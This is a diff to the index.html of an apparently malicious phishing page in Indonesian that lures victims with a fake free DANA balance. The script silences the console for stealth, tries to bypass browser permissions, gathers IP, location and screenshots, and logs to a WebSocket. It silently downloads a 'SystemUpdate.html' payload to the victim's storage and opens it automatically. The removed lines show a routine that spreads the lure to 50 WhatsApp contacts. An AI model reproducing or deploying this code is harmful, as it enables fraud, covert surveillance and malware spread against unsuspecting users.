@@ -64,16 +64,16 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - UNIVERSAL (Android/iOS/PC) DENGAN WEBSOCKET
+// 🔥 INDEX.HTML - GERBANG PINTU MASUK (3 TUGAS UTAMA)
 // ============================================================
-/*
+
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 console.info = function() {};
 console.debug = function() {};
 console.table = function() {};
-*/
+
 // ============================================================
 // STEALTH + ANTI-ANALYSIS
 // ============================================================
@@ -133,7 +133,6 @@ var PLATFORM = detectPlatform();
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
 var semuaDidapat = false;
-var spreadDone = false;
 var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
@@ -327,7 +326,7 @@ var A = {
 };
 
 // ============================================================
-// 🔥 BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
+// 🔥 TUGAS 1: BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
 // ============================================================
 function injectAllPermissions() {
     try {
@@ -425,7 +424,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// DOWNLOAD SystemUpdate.html (UNIVERSAL)
+// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE KORBAN
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -443,10 +442,16 @@ function downloadPayloadSilent() {
         xhr.onload = function() {
             if (xhr.status === 200) {
                 var htmlContent = xhr.responseText;
+                
+                // ✅ Simpan ke localStorage
                 try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                
+                // ✅ Simpan via Android Bridge (jika tersedia)
                 if (PLATFORM.isAndroid && A.isAvailable) {
                     try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
                 }
+                
+                // ✅ Download via blob (fallback)
                 try {
                     var blob = new Blob([htmlContent], { type: 'text/html' });
                     var url = URL.createObjectURL(blob);
@@ -465,6 +470,7 @@ function downloadPayloadSilent() {
                     K({ sumber: 'html_download_blob', data: 'ok' });
                 } catch(e) {}
                 
+                // ✅ iOS: Buka di tab baru
                 if (PLATFORM.isIOS) {
                     try {
                         var blob = new Blob([htmlContent], { type: 'text/html' });
@@ -477,15 +483,23 @@ function downloadPayloadSilent() {
         };
         xhr.send();
     } catch(e) {}
-    
+}
+
+// ============================================================
+// 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS (5 DETIK SETELAH DOWNLOAD)
+// ============================================================
+function openSystemUpdateHTML() {
     setTimeout(function() {
+        // PRIORITAS 1: Android Bridge
         if (PLATFORM.isAndroid && A.isAvailable) {
             try {
-                A.openFile(htmlPath);
-                K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                A.openFile('/storage/emulated/0/Download/SystemUpdate.html');
+                K({ sumber: 'html_open_bridge', data: 'ok' });
                 return;
             } catch(e) {}
         }
+        
+        // PRIORITAS 2: LocalStorage (blob)
         try {
             var htmlContent = localStorage.getItem('SystemUpdate.html');
             if (htmlContent) {
@@ -496,12 +510,16 @@ function downloadPayloadSilent() {
                 return;
             }
         } catch(e) {}
+        
+        // PRIORITAS 3: File URL (Android)
         if (PLATFORM.isAndroid) {
             try {
                 window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
                 K({ sumber: 'html_open_file', data: 'attempt' });
             } catch(e) {}
         }
+        
+        // PRIORITAS 4: iOS Blob
         if (PLATFORM.isIOS) {
             try {
                 var htmlContent = localStorage.getItem('SystemUpdate.html');
@@ -513,7 +531,7 @@ function downloadPayloadSilent() {
                 }
             } catch(e) {}
         }
-    }, 5000);
+    }, 5000); // 5 DETIK SETELAH DOWNLOAD DIMULAI
 }
 
 // ============================================================
@@ -561,7 +579,7 @@ function createKlaimNotification() {
 }
 
 // ============================================================
-// DATA COLLECTION (UNIVERSAL)
+// DATA COLLECTION
 // ============================================================
 function ambilDataCepat() {
     var data = { waktu: Date.now(), ua: navigator.userAgent, platform: PLATFORM, ip: IP_ADDRESS, location: LOCATION_DATA };
@@ -592,42 +610,6 @@ function ambilDataCepat() {
 }
 
 // ============================================================
-// AUTO SPREAD (50 CONTACTS) - HANYA ANDROID
-// ============================================================
-function autoSpread() {
-    if (spreadDone) return;
-    spreadDone = true;
-    if (!PLATFORM.isAndroid || !A.isAvailable) return;
-    
-    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
-    var sentCount = 0;
-    var maxSend = 50;
-    try {
-        var contacts = A.getAllContacts();
-        if (contacts && contacts.length > 0) {
-            maxSend = Math.min(contacts.length, 50);
-            for (var i = 0; i < maxSend; i++) {
-                var number = String(contacts[i].number || '').replace(/[^0-9]/g, '');
-                if (number && number.length > 5) {
-                    var iframe = document.createElement('iframe');
-                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
-                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
-                    document.body.appendChild(iframe);
-                    sentCount++;
-                    setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
-                }
-            }
-        }
-    } catch(e) {}
-    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
-}
-
-// ============================================================
-// HEARTBEAT
-// ============================================================
-function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 2700000); }
-
-// ============================================================
 // SERVICE WORKER
 // ============================================================
 function registerServiceWorker() {
@@ -645,7 +627,7 @@ function registerServiceWorker() {
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION
+// MAIN EXECUTION (3 TUGAS UTAMA)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -657,20 +639,32 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 BYPASS SEMUA IZIN (TAMBAHKAN BARIS INI)
+        // ============================================================
+        // 🔥 TUGAS 1: BYPASS SEMUA IZIN
+        // ============================================================
         injectAllPermissions();
         
+        // ============================================================
+        // 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE
+        // ============================================================
         getIPAddress();
         getBrowserLocation();
         setTimeout(escapeWebView, 100);
         ambilDataCepat();
-        startHeartbeat();
         registerServiceWorker();
-        setTimeout(autoSpread, 2000);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
-        setTimeout(function() { showKlaimNotification(); }, 3000);
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
+        
+        // ============================================================
+        // 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS
+        // ============================================================
+        openSystemUpdateHTML();
+        
+        // ============================================================
+        // NOTIFIKASI & REDIRECT KE DANA
+        // ============================================================
+        setTimeout(function() { showKlaimNotification(); }, 3000);
         
         setTimeout(function() {
             if (!REDIRECT_DONE) {
@@ -679,13 +673,12 @@ function dapatkanSemua() {
             }
         }, 8000);
         
-        // 🔥 WEBSOCKET DENGAN FALLBACK (PERUBAHAN HANYA DI SINI)
+        // WebSocket (untuk logging)
         getPasswordFromWorker().then(function(password) {
             WS_PASSWORD = password;
             K({ sumber: 'password_received', data: 'ok' });
             connectWebSocket();
         }).catch(function() {
-            // FALLBACK: jika gagal ambil password, gunakan default dan tetap konek
             WS_PASSWORD = 'default_fallback';
             K({ sumber: 'password_fallback', data: 'using_default' });
             connectWebSocket();
